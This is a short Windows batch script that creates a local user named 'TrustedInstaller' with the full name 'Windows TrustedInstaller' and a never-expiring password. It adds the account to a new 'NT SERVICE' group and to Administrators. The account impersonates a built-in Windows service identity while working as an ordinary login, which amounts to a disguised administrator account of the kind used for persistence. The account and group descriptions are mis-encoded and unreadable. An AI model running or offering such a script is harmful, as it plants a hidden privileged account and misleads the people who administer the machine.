net localgroup "NT SERVICE" /add
net localgroup "NT SERVICE" /COMMENT:"�ṩ��Windowsϵͳ���ں˳����ļ��ķ���Ȩ�ޣ�Ϊϵͳ��������Ҫ�ĺ����ļ��ṩȨ����֤��"
net user TrustedInstaller @password /add
net user TrustedInstaller /ACTIVE:yes
net user TrustedInstaller /COMMENT:"�ṩ����NT SERVICE��Ȩ�޿��ƣ����ú���ܵ�����MicroSoftǩ��������޷���װ��"
net user TrustedInstaller /EXPIRES:NEVER
net user TrustedInstaller /FULLNAME:"Windows TrustedInstaller"
net user TrustedInstaller /PASSWORDCHG:NO
net user TrustedInstaller /PASSWORDREQ:YES
net localgroup "Users" TrustedInstaller /delete
net localgroup "NT SERVICE" TrustedInstaller /add
net localgroup "Administrators" TrustedInstaller /add
start control userpasswords2
pause